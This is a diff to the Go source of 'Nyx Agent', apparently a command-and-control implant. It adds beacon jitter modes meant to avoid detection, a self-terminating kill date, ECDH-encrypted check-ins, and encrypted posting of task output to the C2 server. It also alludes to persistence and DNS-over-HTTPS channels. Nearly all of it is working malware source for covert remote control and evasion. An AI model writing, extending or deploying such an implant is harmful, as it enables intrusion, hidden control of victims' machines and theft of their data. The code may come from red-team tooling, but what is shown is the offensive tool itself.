@@ -6,6 +6,7 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"math"
 	"math/rand"
 	"net"
 	"net/http"
@@ -19,17 +20,71 @@ import (
 )
 
 // Overridden at build time via -ldflags
-var C2URL       = "http://127.0.0.1:8000"
+var C2URL         = "http://127.0.0.1:8000"
 var DefaultSleep  = "5"
 var DefaultJitter = "1"
-// XORKey: when non-empty, C2URL is a hex-encoded XOR-obfuscated string.
-// Set via -ldflags "-X main.XORKey=<key>" to enable string obfuscation.
-var XORKey = ""
+var XORKey        = ""   // enables XOR obfuscation of C2URL
+var JitterMode    = "linear" // linear | gaussian | sinusoidal | burst
+var KillDate      = ""   // "YYYY-MM-DD" — agent self-destructs after this date
+
+var burstCounter int
 
 func init() {
 	if XORKey != "" {
 		C2URL = xorDecodeHex(C2URL, XORKey)
 	}
+}
+
+// checkKillDate exits if the compiled kill date has passed.
+func checkKillDate() {
+	if KillDate == "" {
+		return
+	}
+	t, err := time.Parse("2006-01-02", KillDate)
+	if err != nil {
+		return
+	}
+	if time.Now().After(t) {
+		fmt.Printf("[!] Kill date %s reached — self-terminating.\n", KillDate)
+		os.Exit(0)
+	}
+}
+
+// sleepWithJitter waits according to the selected jitter mode.
+func sleepWithJitter(baseSeconds, jitterSeconds int) {
+	var dur float64
+	base := float64(baseSeconds)
+	jit := float64(jitterSeconds)
+
+	switch JitterMode {
+	case "gaussian":
+		// Box-Muller transform → normal distribution
+		u1 := rand.Float64() + 1e-9
+		u2 := rand.Float64()
+		z := math.Sqrt(-2*math.Log(u1)) * math.Cos(2*math.Pi*u2)
+		dur = base + z*jit
+	case "sinusoidal":
+		// Slow sinusoidal wave — period ≈ 10× sleep interval
+		t := float64(time.Now().Unix())
+		wave := math.Sin(t / (base * 5))
+		dur = base + wave*jit
+	case "burst":
+		// 3 fast beacons then 1 long pause (avoids uniform interval detection)
+		burstCounter++
+		if burstCounter%4 == 0 {
+			dur = base * 3
+		} else {
+			dur = base/3 + 1
+		}
+	default: // "linear"
+		jitter := rand.Intn(jitterSeconds*2+1) - jitterSeconds
+		dur = float64(baseSeconds + jitter)
+	}
+
+	if dur < 1 {
+		dur = 1
+	}
+	time.Sleep(time.Duration(dur * float64(time.Second)))
 }
 
 func xorDecodeHex(hexStr, key string) string {
@@ -51,6 +106,7 @@ type CheckinRequest struct {
 	OS       string `json:"os"`
 	Arch     string `json:"arch"`
 	IP       string `json:"ip"`
+	PubKey   string `json:"pub_key,omitempty"` // ECDH P-256 public key (hex)
 }
 
 type Task struct {
@@ -59,10 +115,11 @@ type Task struct {
 }
 
 type CheckinResponse struct {
-	AgentID string `json:"agent_id"`
-	Sleep   string `json:"sleep"`
-	Jitter  string `json:"jitter"`
-	Task    *Task  `json:"task"`
+	AgentID   string `json:"agent_id"`
+	Sleep     string `json:"sleep"`
+	Jitter    string `json:"jitter"`
+	Task      *Task  `json:"task"`
+	ServerPub string `json:"server_pub,omitempty"` // ECDH server public key (hex)
 }
 
 type TaskResult struct {
@@ -108,15 +165,38 @@ func checkin(agentID string) (*CheckinResponse, error) {
 		IP:       getOutboundIP(),
 	}
 
+	// Include ECDH pub key on first checkin (before key exchange completes)
+	if !ecdhDone && ecdhPubHex != "" {
+		payload.PubKey = ecdhPubHex
+	}
+
 	data, _ := json.Marshal(payload)
-	resp, err := client.Post(C2URL+"/api/agents/checkin", "application/json", bytes.NewBuffer(data))
+
+	// Append agent ID as query param once we have it (so server can look up session key)
+	uri := C2URL + profileURI(ProfileCheckin, agentID)
+	if agentID != "" {
+		uri += "?id=" + agentID
+	}
+
+	// Use encryption if key exchange is already done
+	var resp *http.Response
+	var err error
+	if ecdhDone || aesGCM != nil {
+		resp, err = encPost(uri, ProfileContentType, data)
+	} else {
+		resp, err = profileDo("POST", uri, bytes.NewBuffer(data))
+	}
 	if err != nil {
 		return nil, err
 	}
-	defer resp.Body.Close()
+
+	body, err := readDecrypted(resp)
+	if err != nil {
+		return nil, err
+	}
 
 	var result CheckinResponse
-	json.NewDecoder(resp.Body).Decode(&result)
+	json.Unmarshal(body, &result)
 	return &result, nil
 }
 
@@ -145,8 +225,8 @@ func handleTask(agentID string, task *Task) {
 
 	result := TaskResult{TaskID: task.ID, Output: output, Status: status}
 	data, _ := json.Marshal(result)
-	url := fmt.Sprintf("%s/api/agents/%s/result", C2URL, agentID)
-	resp, err := client.Post(url, "application/json", bytes.NewBuffer(data))
+	url := C2URL + profileURI(ProfileResult, agentID)
+	resp, err := encPost(url, ProfileContentType, data)
 	if err != nil {
 		fmt.Printf("[-] Failed to send result: %v\n", err)
 		return
@@ -594,11 +674,23 @@ func removePersistence() string {
 }
 
 func main() {
-	fmt.Println("[*] Nyx Agent v0.5.0 starting...")
+	fmt.Println("[*] Nyx Agent v0.6.0 starting...")
+
+	// Kill date check
+	checkKillDate()
+
+	// Static AES key (legacy / fallback)
 	if err := initCrypto(); err != nil {
 		fmt.Printf("[!] Crypto init warning: %v\n", err)
 	} else if EncKey != "" {
-		fmt.Println("[+] AES-256-GCM traffic encryption active")
+		fmt.Println("[+] Static AES-256-GCM key active (legacy mode)")
+	}
+
+	// ECDH ephemeral key generation
+	if err := initECDH(); err != nil {
+		fmt.Printf("[!] ECDH init warning: %v\n", err)
+	} else {
+		fmt.Printf("[+] ECDH keypair ready (profile: %s, jitter: %s)\n", ProfileName, JitterMode)
 	}
 
 	var agentID string
@@ -606,7 +698,16 @@ func main() {
 	sleepSeconds := 5
 	jitterSeconds := 1
 
+	if s, err := strconv.Atoi(DefaultSleep); err == nil {
+		sleepSeconds = s
+	}
+	if j, err := strconv.Atoi(DefaultJitter); err == nil {
+		jitterSeconds = j
+	}
+
 	for {
+		checkKillDate()
+
 		resp, err := checkin(agentID)
 		if err != nil {
 			fmt.Printf("[-] Checkin failed: %v — retrying in %ds\n", err, sleepSeconds)
@@ -615,6 +716,13 @@ func main() {
 		}
 
 		agentID = resp.AgentID
+
+		// Complete ECDH key exchange on first checkin that returns server_pub
+		if resp.ServerPub != "" && !ecdhDone {
+			if err := deriveSessionKey(resp.ServerPub); err != nil {
+				fmt.Printf("[!] ECDH key derivation failed: %v\n", err)
+			}
+		}
 
 		if !dohStarted && DohVar != "" && C2Domain != "" {
 			dohStarted = true
@@ -632,11 +740,6 @@ func main() {
 			go handleTask(agentID, resp.Task)
 		}
 
-		jitter := rand.Intn(jitterSeconds*2+1) - jitterSeconds
-		sleepDur := time.Duration(sleepSeconds+jitter) * time.Second
-		if sleepDur < time.Second {
-			sleepDur = time.Second
-		}
-		time.Sleep(sleepDur)
+		sleepWithJitter(sleepSeconds, jitterSeconds)
 	}
 }
